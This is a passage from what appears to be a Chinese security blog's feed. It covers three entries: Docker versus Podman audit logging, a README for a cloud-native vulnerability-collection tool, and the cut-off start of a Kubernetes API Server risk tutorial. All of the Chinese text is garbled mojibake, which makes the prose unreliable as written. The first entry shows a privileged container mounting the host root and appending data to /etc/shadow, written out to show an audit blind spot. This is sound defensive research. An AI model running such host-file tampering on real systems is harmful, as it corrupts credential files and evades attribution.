çš„<code>loginuid</code>æ¥è¿›è¡ŒéªŒè¯ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œdockerd å’Œ systemd çš„ loginuid éƒ½æ˜¯é»˜è®¤å€¼<code>4294967295</code>ã€‚</p><ol><li><p>æŸ¥çœ‹ dockerd å’Œ systemd çš„è¿›ç¨‹ IDï¼ˆsystemd çš„è¿›ç¨‹ ID ä¸€èˆ¬ä¸º 1ï¼‰ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps -eo pid,uid,<span class="hljs-built_in">comm</span> | egrep <span class="hljs-string">&#x27;dockerd|systemd&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>æŸ¥çœ‹ dockerd å’Œ systemd çš„ loginuidã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/[pid]/loginuid<br></code></pre></td></tr></table></figure></li></ol><p><img src="/image/662.png" alt="å›¾ 6: dockerd å’Œ systemd çš„ loginuid ä¸ºé»˜è®¤å€¼"></p><h2 id="0x03-æ”»å‡»æ¡ˆä¾‹ï¼šä»å®¹å™¨ä¸­ä¿®æ”¹å®¿ä¸»æœºæ–‡ä»¶"><a href="#0x03-æ”»å‡»æ¡ˆä¾‹ï¼šä»å®¹å™¨ä¸­ä¿®æ”¹å®¿ä¸»æœºæ–‡ä»¶" class="headerlink" title="0x03 æ”»å‡»æ¡ˆä¾‹ï¼šä»å®¹å™¨ä¸­ä¿®æ”¹å®¿ä¸»æœºæ–‡ä»¶"></a>0x03 æ”»å‡»æ¡ˆä¾‹ï¼šä»å®¹å™¨ä¸­ä¿®æ”¹å®¿ä¸»æœºæ–‡ä»¶</h2><p>é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡å¯åŠ¨ Podman å®¹å™¨å’Œ Docker å®¹å™¨æ¥ä¿®æ”¹å®¿ä¸»æœºçš„ <code>/etc/shadow</code> æ–‡ä»¶ï¼Œaudit è®°å½•ä¸‹æ¥çš„æ—¥å¿—åˆæœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ Docker å®¹å™¨çš„ã€‚</p><ol><li><p>å¯åŠ¨ä¸€ä¸ªå¯äº¤äº’çš„ä¸´æ—¶çš„ç‰¹æƒå®¹å™¨ï¼Œå¹¶å°†å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚åœ¨åˆ°å®¹å™¨çš„ <code>/host</code> ç›®å½•ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run -it --<span class="hljs-built_in">rm</span> --privileged -v /:/host alpine sh<br><br></code></pre></td></tr></table></figure></li><li><p>å‘å®¿ä¸»æœºçš„ <code>/etc/shadow</code> æ–‡ä»¶å†™å…¥æ•°æ®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;docker,miao~&#x27;</span> | <span class="hljs-built_in">tee</span> -a /host/etc/shadow &gt; /dev/null<br><br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ audit æ‰€æä¾›çš„å·¥å…· <code>ausearch</code> æ¥æœç´¢è¿‘æœŸä¸ <code>/etc/shadow</code> æ–‡ä»¶ç›¸å…³çš„äº‹ä»¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ausearch -f /etc/shadow -i -ts recent<br><br></code></pre></td></tr></table></figure></li></ol><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œaudit å¯ä»¥è®°å½• <code>/etc/shadow</code> æ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œä½†æ˜¯ä¸çŸ¥é“æ˜¯è°ä¿®æ”¹çš„ï¼ˆauid&#x3D;unsetï¼‰ã€‚åœ¨çœŸå®çš„ä¸šåŠ¡ç¯å¢ƒä¸­ï¼Œå¦‚æœæ”»å‡»è€…éšååˆ é™¤äº†è¿™ä¸ª Docker å®¹å™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ ¹æœ¬æ— æ³•ä»æµ·é‡çš„æ•°æ®ä¸­å‡†ç¡®æ‰¾åˆ°ä¿®æ”¹ <code>/etc/shadow</code> æ–‡ä»¶çš„ç—•è¿¹ã€‚</p><p><img src="/image/663.png" alt="å›¾ 7: docker å®¹å™¨ä¿®æ”¹å®¿ä¸»æœºçš„ &#x2F;etc&#x2F;shadow æ–‡ä»¶"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ç›¸åŒåœºæ™¯ä¸‹ï¼ŒPodman çš„è¡¨ç°å¦‚ä½•ã€‚Podman ç”±äºä½¿ç”¨ä¼ ç»Ÿçš„ fork&#x2F;exec æ¨¡å‹ï¼Œå› æ­¤å¯ä»¥æ­£ç¡®è®°å½•æ‰€æœ‰å†…å®¹ã€‚</p><p><img src="/image/664.png" alt="å›¾ 8:podman å®¹å™¨ä¿®æ”¹å®¿ä¸»æœºçš„ &#x2F;etc&#x2F;shadow æ–‡ä»¶"></p><p>æœ€åæˆ‘ä»¬çœ‹åˆ° <code>/etc/shadow</code> éƒ½è¢«å†™å…¥äº†æ¶æ„æ•°æ®ã€‚è™½ç„¶è¿™åªæ˜¯å…³äº<code>/etc/shadow</code> æ–‡ä»¶çš„ä¸€ä¸ªç®€å•çš„æ“ä½œï¼Œä½†æœ‰çš„å®‰å…¨äº§å“åº•å±‚ä¼šä½¿ç”¨ audit æ¥åˆ†æè¿›ç¨‹ä¸Šçš„æ¶æ„è¡Œä¸ºï¼Œæ‰€ä»¥ä¸ºäº†ä¿æŒæ›´å¥½çš„å®‰å…¨æ€§ï¼Œæˆ‘ä»¬æ¨èä½¿ç”¨åŸºäº fork&#x2F;exec å¯åŠ¨å®¹å™¨çš„è¿è¡Œæ—¶è€Œä¸æ˜¯åŸºäº C&#x2F;S å¯åŠ¨å®¹å™¨çš„è¿è¡Œæ—¶ã€‚</p><p><img src="/image/665.png" alt="å›¾ 9ï¼špodman å®¹å™¨å’Œ docker å®¹å™¨éƒ½å¾€å®¿ä¸»æœºå†™å…¥æ¶æ„æ•°æ®"></p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>æœ¬æ–‡ï¼Œæˆ‘ä»¬ä»æ—¥å¿—å®¡è®¡çš„è§’åº¦è§£é‡Šä¸ºä»€ä¹ˆ Podman æ¯” Docker æ›´å®‰å…¨ï¼š</p><ul><li>**Podman ä½¿ç”¨ä¼ ç»Ÿçš„ fork&#x2F;exec æ¨¡å‹ã€‚**å®¹å™¨è¿›ç¨‹æ­£ç¡®ç»§æ‰¿çˆ¶è¿›ç¨‹çš„ <code>loginuid</code>ï¼Œä½¿ç³»ç»Ÿèƒ½è¿½è¸ªåˆ°æ“ä½œçš„å‘èµ·ç”¨æˆ·ï¼›</li><li>**è€Œ Docker ä½¿ç”¨ C&#x2F;S æ¨¡å‹ã€‚**å®¹å™¨è¿›ç¨‹ç»§æ‰¿ Docker å®ˆæŠ¤è¿›ç¨‹ï¼ˆdockerdï¼‰çš„ <code>loginuid</code>ï¼ˆå€¼ä¸º 4294967295ï¼‰ï¼Œå› æ­¤æ— æ³•è¿½è¸ªå…·ä½“çš„æ“ä½œç”¨æˆ·ã€‚</li></ul><p>åœ¨å®é™…æ”»å‡»åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…é€šè¿‡ Docker å®¹å™¨ä¿®æ”¹å®¿ä¸»æœºçš„å…³é”®æ–‡ä»¶æ—¶ï¼Œaudit æ—¥å¿—æ— æ³•è®°å½•æ“ä½œè€…èº«ä»½ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒPodman å®¹å™¨çš„æ‰€æœ‰æ“ä½œéƒ½èƒ½è¢« audit å‡†ç¡®è®°å½•ï¼Œæœ‰åˆ©äºåç»­çš„å®‰å…¨å®¡è®¡å’Œè¿½è¸ªã€‚</p><p>é™¤äº†æ—¥å¿—å®¡è®¡çš„ä¼˜åŠ¿ï¼ŒPodman è¿˜å…·æœ‰ä»¥ä¸‹å®‰å…¨ç‰¹æ€§ï¼š</p><ul><li><strong>æ— éœ€ root æƒé™å³å¯è¿è¡Œå®¹å™¨ï¼Œé¿å…äº†å®ˆæŠ¤è¿›ç¨‹å¯èƒ½å¸¦æ¥çš„å®‰å…¨é£é™©ï¼›</strong><ul><li>Docker è¿™ç±»é‡‡ç”¨ C&#x2F;S æ¨¡å‹çš„è¿è¡Œæ—¶éœ€è¦ç”¨æˆ·ä»¥ root æƒé™è¿è¡Œå®ˆæŠ¤è¿›ç¨‹å¹¶æ‰“å¼€å¥—æ¥å­—æ¥å¯åŠ¨å®¹å™¨ã€‚è¿™å¯¼è‡´æˆ‘ä»¬åªèƒ½ä¾èµ–å®ˆæŠ¤è¿›ç¨‹å®ç°çš„å®‰å…¨æœºåˆ¶ï¼Œè‹¥å®ˆæŠ¤è¿›ç¨‹å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å°±å¯èƒ½ç›´æ¥å½±å“ä¸»æœºæ“ä½œç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚</li></ul></li><li>æ”¯æŒ systemd çš„ <code>SD_NOTIFY</code> åŠŸèƒ½å’Œå¥—æ¥å­—æ¿€æ´»åŠŸèƒ½ï¼Œæä¾›æ›´å®‰å…¨é«˜æ•ˆçš„æœåŠ¡ç®¡ç†æ–¹å¼ã€‚<ul><li>å½“æˆ‘ä»¬å°† podman å‘½ä»¤æ”¾å…¥ systemd unit æ–‡ä»¶ä¸­ï¼Œå®¹å™¨è¿›ç¨‹å¯é€šè¿‡ Podman å‘ systemd å‘é€é€šçŸ¥ï¼Œè¡¨æ˜å®¹å™¨å·²å°±ç»ªå¹¶å¯æ¥å—å¤–éƒ¨è¯·æ±‚ã€‚<code>SD_NOTIFY</code>åŠŸèƒ½æé«˜äº†æœåŠ¡å¯åŠ¨æ•ˆç‡ï¼Œé¿å…ç«æ€æ¡ä»¶ï¼Œå®ç°æ›´ç²¾ç¡®çš„æœåŠ¡ç®¡ç†ã€‚</li><li>æ­¤å¤–ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿æ¥å¥—æ¥å­—ä» systemd ä¼ é€’åˆ° Podmanï¼Œå†ä¼ é€’åˆ°å®¹å™¨è¿›ç¨‹ã€‚è¿™æ ·å®¹å™¨æ— éœ€ç‹¬ç«‹å¤„ç†ç½‘ç»œè¿æ¥ï¼Œåªéœ€é€šè¿‡ systemd å°±èƒ½ç›´æ¥å“åº”å¤–éƒ¨ç½‘ç»œè¯·æ±‚ï¼Œå‡å°‘äº†é¢å¤–é…ç½®ã€‚</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>collect-cloud-native-sec-vuln: äº‘åŸç”Ÿå®‰å…¨æ¼æ´æ”¶é›†å·¥å…·</title>
    <link href="/2024/12/21/collect-cloud-native-sec-vuln-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/12/21/collect-cloud-native-sec-vuln-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00 æ¦‚è¿°"></a>0x00 æ¦‚è¿°</h2><p>collect-cloud-native-sec-vuln æ˜¯ä¸€æ¬¾ç”¨äºæ”¶é›†äº‘åŸç”Ÿç”Ÿæ€ç³»ç»Ÿä¸­å„ä¸ªç»„ä»¶å®‰å…¨æ¼æ´çš„å·¥å…·ã€‚</p><p><img src="/image/img_0.png" alt="å›¾ 1ï¼šå·¥å…·æ‰‹å†Œ"></p><p>é€šè¿‡è‡ªåŠ¨åŒ–æ–¹å¼ï¼Œå®ƒèƒ½å¸®åŠ©ä½ åŠæ—¶è·å–åˆ°ç›¸å…³é¡¹ç›®çš„æœ€æ–°å®‰å…¨ä¿¡æ¯ï¼Œä»¥ä¾¿é‡‡å–ç›¸åº”çš„é˜²æŠ¤æªæ–½ã€‚</p><p><img src="/image/img_1.png" alt="å›¾ 2ï¼šè¿è¡Œæˆªå›¾"></p><p>æ‰€æœ‰æ”¶é›†çš„ JSON æ•°æ®é€šè¿‡ Github Actionï¼Œæ¯ 6 å°æ—¶æ›´æ–°åœ¨ä»“åº“ <a href="https://github.com/miao2sec/cloud-native-sec-vuln">cloud-native-sec-vuln</a> ä¸­ã€‚</p><p><img src="/image/img.png" alt="å›¾ 3ï¼šæ•°æ®ç¤ºä¾‹"></p><h2 id="0x01-å¿«é€Ÿå¼€å§‹"><a href="#0x01-å¿«é€Ÿå¼€å§‹" class="headerlink" title="0x01 å¿«é€Ÿå¼€å§‹"></a>0x01 å¿«é€Ÿå¼€å§‹</h2><h3 id="1-1-å®‰è£…"><a href="#1-1-å®‰è£…" class="headerlink" title="1.1 å®‰è£…"></a>1.1 å®‰è£…</h3><ol><li><p>ç¡®ä¿ä½ çš„ç³»ç»Ÿå·²å®‰è£… Go ç¯å¢ƒï¼Œå¹¶å…‹éš†æœ¬é¡¹ç›®åˆ°æœ¬åœ°ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/miao2sec/collect-cloud-native-sec-vuln.git<br></code></pre></td></tr></table></figure></li><li><p>ç¼–è¯‘å¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> collect-cloud-native-sec-vuln.git<br>go build -o collect<br></code></pre></td></tr></table></figure></li></ol><h3 id="1-2-ä½¿ç”¨"><a href="#1-2-ä½¿ç”¨" class="headerlink" title="1.2 ä½¿ç”¨"></a>1.2 ä½¿ç”¨</h3><ol><li><p>(ä½¿ç”¨é»˜è®¤é…ç½®) è¿›è¡Œæ¼æ´æ”¶é›†</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect<br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿæˆé»˜è®¤çš„é…ç½®æ–‡ä»¶</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect -g<br></code></pre></td></tr></table></figure></li><li><p>è‡ªå®šä¹‰æ¼æ´æ•°æ®çš„ç¼“å­˜è·¯å¾„</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect -r -c path/to/cacheDir<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨è‡ªå®šä¹‰çš„é…ç½®æ–‡ä»¶è¿›è¡Œæ¼æ´æ”¶é›†</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./collect -r -f &lt;config&gt;.yaml<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x02-åŠŸèƒ½ç‰¹æ€§"><a href="#0x02-åŠŸèƒ½ç‰¹æ€§" class="headerlink" title="0x02 åŠŸèƒ½ç‰¹æ€§"></a>0x02 åŠŸèƒ½ç‰¹æ€§</h2><ul><li>è‡ªåŠ¨æ”¶é›†äº‘åŸç”Ÿç”Ÿæ€ç³»ç»Ÿä¸­å„ä¸ªç»„ä»¶çš„å®‰å…¨æ¼æ´ä¿¡æ¯ã€‚</li><li>æ”¯æŒè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œçµæ´»è°ƒæ•´æ”¶é›†ç­–ç•¥ã€‚</li><li>æ”¯æŒè‡ªå®šä¹‰ç¼“å­˜ç›®å½•ï¼Œéšæ—¶æŸ¥çœ‹æ¼æ´æ•°æ®ã€‚</li><li>æ”¯æŒå¤šç§å‘½ä»¤è¡Œå‚æ•°ï¼Œæ–¹ä¾¿ç”¨æˆ·æ“ä½œã€‚</li></ul><h2 id="0x03-é…ç½®è¯´æ˜"><a href="#0x03-é…ç½®è¯´æ˜" class="headerlink" title="0x03 é…ç½®è¯´æ˜"></a>0x03 é…ç½®è¯´æ˜</h2><p>é…ç½®æ–‡ä»¶é‡‡ç”¨ YAML æ ¼å¼ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¤ºä¾‹é…ç½®ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># tokenï¼šGitHub API Tokenï¼Œç”¨äºè®¿é—® GitHub API</span><br><span class="hljs-attr">token:</span> <span class="hljs-string">write-your-github-token</span><br><span class="hljs-comment"># cache_dirï¼šæ¼æ´æ•°æ®å­˜å‚¨ç›®å½•</span><br><span class="hljs-attr">cache_dir:</span> <span class="hljs-string">cloud-native-sec-vuln</span><br><span class="hljs-comment"># componentsï¼šéœ€è¦æ”¶é›†æ¼æ´ä¿¡æ¯çš„ç»„ä»¶åˆ—è¡¨ï¼ŒåŒ…æ‹¬ç»„ä»¶çš„ owner å’Œ repoã€‚</span><br><span class="hljs-attr">components:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">owner:</span> <span class="hljs-string">moby</span><br>      <span class="hljs-attr">repo:</span> <span class="hljs-string">buildkit</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">owner:</span> <span class="hljs-string">opencontainers</span><br>      <span class="hljs-attr">repo:</span> <span class="hljs-string">runc</span><br></code></pre></td></tr></table></figure><h2 id="0x04-ç»„ä»¶æ”¯æŒ"><a href="#0x04-ç»„ä»¶æ”¯æŒ" class="headerlink" title="0x04 ç»„ä»¶æ”¯æŒ"></a>0x04 ç»„ä»¶æ”¯æŒ</h2><h3 id="4-1-è¿è¡Œæ—¶ç»„ä»¶"><a href="#4-1-è¿è¡Œæ—¶ç»„ä»¶" class="headerlink" title="4.1 è¿è¡Œæ—¶ç»„ä»¶"></a>4.1 è¿è¡Œæ—¶ç»„ä»¶</h3><ol><li>Docker (Moby)</li><li>runc</li><li>containerd</li><li>CRI-O</li><li>gVisor</li><li>inclavare-containers</li><li>iSulad</li><li>Kata Containers</li><li>Krustlet</li><li>Kuasar</li><li>Lima</li><li>LXC</li><li>rkt</li><li>Singularity</li><li>SmartOS</li><li>Stratovirt</li><li>Sysbox</li><li>Virtual Kubelet</li><li>WasmEdge</li><li>Youki</li><li>Podman</li></ol><h3 id="4-2-ç½‘ç»œç»„ä»¶"><a href="#4-2-ç½‘ç»œç»„ä»¶" class="headerlink" title="4.2 ç½‘ç»œç»„ä»¶"></a>4.2 ç½‘ç»œç»„ä»¶</h3><ol><li>Cilium</li></ol><h3 id="4-3-å®¹å™¨é•œåƒæ„å»º"><a href="#4-3-å®¹å™¨é•œåƒæ„å»º" class="headerlink" title="4.3 å®¹å™¨é•œåƒæ„å»º"></a>4.3 å®¹å™¨é•œåƒæ„å»º</h3><ol><li>Kaniko</li><li>BuildKit</li><li>Buildah</li><li>Bazel</li><li>img</li><li>orca-build</li></ol><h3 id="4-4-æœåŠ¡ç½‘æ ¼"><a href="#4-4-æœåŠ¡ç½‘æ ¼" class="headerlink" title="4.4 æœåŠ¡ç½‘æ ¼"></a>4.4 æœåŠ¡ç½‘æ ¼</h3><ol><li>istio</li></ol><h3 id="4-5-å®¹å™¨ç¼–æ’"><a href="#4-5-å®¹å™¨ç¼–æ’" class="headerlink" title="4.5 å®¹å™¨ç¼–æ’"></a>4.5 å®¹å™¨ç¼–æ’</h3><ol><li>kubernetes</li></ol><h3 id="4-6-å®¹å™¨ç®¡ç†å¹³å°"><a href="#4-6-å®¹å™¨ç®¡ç†å¹³å°" class="headerlink" title="4.6 å®¹å™¨ç®¡ç†å¹³å°"></a>4.6 å®¹å™¨ç®¡ç†å¹³å°</h3><ol><li>rancher</li></ol><h3 id="4-7-åè°ƒä¸æœåŠ¡å‘ç°"><a href="#4-7-åè°ƒä¸æœåŠ¡å‘ç°" class="headerlink" title="4.7 åè°ƒä¸æœåŠ¡å‘ç°"></a>4.7 åè°ƒä¸æœåŠ¡å‘ç°</h3><ol><li>coredns</li><li>etcd</li><li>zookeeper</li><li>kubebrain</li><li>nacos</li><li>k8gb</li><li>eureka</li><li>Xline</li></ol><h3 id="4-8-å¯†é’¥ç®¡ç†"><a href="#4-8-å¯†é’¥ç®¡ç†" class="headerlink" title="4.8 å¯†é’¥ç®¡ç†"></a>4.8 å¯†é’¥ç®¡ç†</h3><ol><li>chaos-mesh</li><li>litmus</li><li>chaostoolkit</li><li>chaosblade</li><li>chaoskube</li><li>powerfulseal</li><li>kubeinvaders</li><li>krkn</li></ol><h2 id="0x05-è´¡çŒ®æŒ‡å—"><a href="#0x05-è´¡çŒ®æŒ‡å—" class="headerlink" title="0x05 è´¡çŒ®æŒ‡å—"></a>0x05 è´¡çŒ®æŒ‡å—</h2><p>æ¬¢è¿å„ä½åŒå­¦å‚ä¸æœ¬é¡¹ç›®ï¼Œå…±åŒå®Œå–„äº‘åŸç”Ÿå®‰å…¨æ¼æ´æ”¶é›†å·¥å…·ã€‚ä»¥ä¸‹æ˜¯è´¡çŒ®æŒ‡å—ï¼š</p><ol><li><p>Fork æœ¬é¡¹ç›®ã€‚</p></li><li><p>åˆ›å»ºæ‚¨çš„ç‰¹æ€§åˆ†æ”¯ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git checkout -b new-feature<br></code></pre></td></tr></table></figure></li><li><p>æäº¤æ‚¨çš„ä¿®æ”¹ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git commit -am <span class="hljs-string">&#x27;Add some feature&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>å°†æ‚¨çš„ä¿®æ”¹æ¨é€åˆ°åˆ†æ”¯ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git push origin new-feature<br></code></pre></td></tr></table></figure></li><li><p>æäº¤ Pull Requestã€‚</p></li></ol><h2 id="0x06-è®¸å¯è¯"><a href="#0x06-è®¸å¯è¯" class="headerlink" title="0x06 è®¸å¯è¯"></a>0x06 è®¸å¯è¯</h2><p>æœ¬é¡¹ç›®é‡‡ç”¨ MIT è®¸å¯è¯ï¼Œè¯¦æƒ…è¯·å‚é˜… <a href="./LICENSE">LICENSE</a> æ–‡ä»¶ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>äº‘åŸç”Ÿå®‰å…¨</tag>
      
      <tag>å·¥å…·è‡ªç ”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API Server å®‰å…¨é£é™©ï¼ˆä¸€ï¼‰ï¼šä¸å®‰å…¨çš„æœåŠ¡ï¼ˆç†è®ºç¯‡ï¼‰</title>
    <link href="/2024/12/05/API-Server-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%90%86%E8%AE%BA%E7%AF%87%EF%BC%89/"/>
    <url>/2024/12/05/API-Server-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%90%86%E8%AE%BA%E7%AF%87%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>åœ¨å®é™…çš„å·¥ä½œå’Œæ”»é˜²å¯¹æŠ—çš„æ—¶å€™ï¼Œæ‚¨æ˜¯å¦é‡åˆ°è¿‡ä»¥ä¸‹é—®é¢˜ï¼š</p><ol><li>ç”±äº API Server é”™è¯¯é…ç½®ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ¥ç®¡é›†ç¾¤ã€‚</li><li>æ ¹æ®æ•™ç¨‹å¯¹ API Server ä¸å®‰å…¨ç«¯å£çš„é£é™©è¿›è¡Œæ¼æ´å¤ç°ï¼Œå´æ— æ³•å¤ç°æˆåŠŸã€‚</li><li>æ— æ³•æ·±å…¥æµ…å‡ºçš„åˆ†æ API Server ä¸å®‰å…¨çš„æœåŠ¡çš„é£é™©ï¼Œè¢« API Server å„ç§å¤§å°ç‰ˆæœ¬ä¹‹é—´çš„å˜åŒ–å¼„å¾—ä¸€å›¢ä¹±ã€‚</li><li>ç”±äºç¯å¢ƒé™åˆ¶ï¼Œæ— æ³•æ­å»ºå¤šä¸ª Kubernetes ç¯å¢ƒè¿›è¡Œé¶åœºç»ƒä¹ ã€‚</li><li>åˆå­¦äº‘åŸç”Ÿå®‰å…¨æ—¶ï¼Œé€šå¸¸æ„Ÿåˆ°æ— ä»ä¸‹æ‰‹ï¼Œéš¾åº¦è¾ƒå¤§ã€‚</li></ol><p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå–µè‹—å®‰å…¨ä¸“å®¶ç»„æˆå‘˜ç‰¹æ„åˆ¶ä½œäº†ä¸€ç³»åˆ—ã€ŠKubernetes å®‰å…¨é˜²æŠ¤æŒ‡å—ï¼ˆåŸºç¡€ç¯‡ï¼‰ã€‹å…è´¹ç‰ˆå›¾æ–‡æ•™ç¨‹ï¼Œå¸®åŠ©å¤§å®¶å…¥é—¨äº‘åŸç”Ÿå®‰å…¨ã€‚æœ¬æ¬¡è¯¾ç¨‹çš„äº®ç‚¹æœ‰ï¼š</p><ol><li>æ ¹æ® Kubernetes å„ä¸ªç‰ˆæœ¬å‘å¸ƒçš„æ—¶é—´çº¿ï¼Œå¸¦é¢†å¤§å®¶é˜…è¯» Kubernetes å…³é”®æºç ï¼Œæ·±å…¥æµ…å‡ºåœ°åˆ†æ Kubernetes é£é™©ã€‚</li><li>åˆ¶ä½œäº†å¼€æºçš„ Kubernetes ç»ƒä¹ é¶åœºï¼Œå¯åœ¨æœ¬åœ°ä¸€é”®å¯åŠ¨ï¼Œæ— éœ€è™šæ‹Ÿæœºå’ŒæœåŠ¡å™¨ã€‚</li><li>ç²¾å¿ƒç»˜åˆ¶çš„æ’å›¾ã€è¯™è°æœ‰è¶£çš„å™è¿°æ–¹å¼ã€ç†è®ºçŸ¥è¯†ä¸é¶åœºç»ƒä¹ ç›¸ç»“åˆï¼Œå¸¦é¢†ä½ é¢†ç•¥ Kubernetes çš„å®‰å…¨ã€‚</li><li>æ­å»ºä¸€ä¸ªç³»ç»Ÿçš„ Kubernetes å­¦ä¹ æ¡†æ¶ï¼Œé˜²æ­¢â€œç®¡ä¸­çª¥è±¹ï¼Œå¯è§ä¸€æ–‘â€ã€‚</li><li>ä¸“å®¶ç»„çš„é“²å±å®˜å°†ç»“åˆè‡ªèº«ç»éªŒï¼Œå¸®åŠ©æ‚¨æ€»ç»“å…³é”®çŸ¥è¯†å’ŒæŠ€èƒ½ã€‚</li></ol><h2 id="0x01-åŸºæœ¬æ¦‚å¿µ"><a href="#0x01-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01 åŸºæœ¬æ¦‚å¿µ"></a>0x01 åŸºæœ¬æ¦‚å¿µ</h2><p>API Server å°±åƒå®ƒåå­—æ‰€æè¿°çš„é‚£æ ·ï¼Œä¸»è¦è´Ÿè´£æä¾› REST API æ¥å£ï¼Œæ–¹ä¾¿æˆ‘ä»¬å¯¹ Kubernetes é›†ç¾¤è¿›è¡Œç®¡æ§ã€‚æ‹¥æœ‰ API Server å…¨éƒ¨æƒé™çš„ç”¨æˆ·ç›¸å½“äºæ‹¥æœ‰äº†é›†ç¾¤ä¸­æ‰€æœ‰æœºå™¨çš„ root è®¿é—®æƒé™ã€‚</p><p>è€Œå‘½ä»¤è¡Œå·¥å…· kubectl å°±æ˜¯ API Server çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œä¸»è¦è´Ÿè´£å‘ API Server å‘é€è¯·æ±‚ä»¥å®ç°èµ„æºå’Œå·¥ä½œè´Ÿè½½çš„ç®¡ç†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä»»ä½•å¯¹ API Server 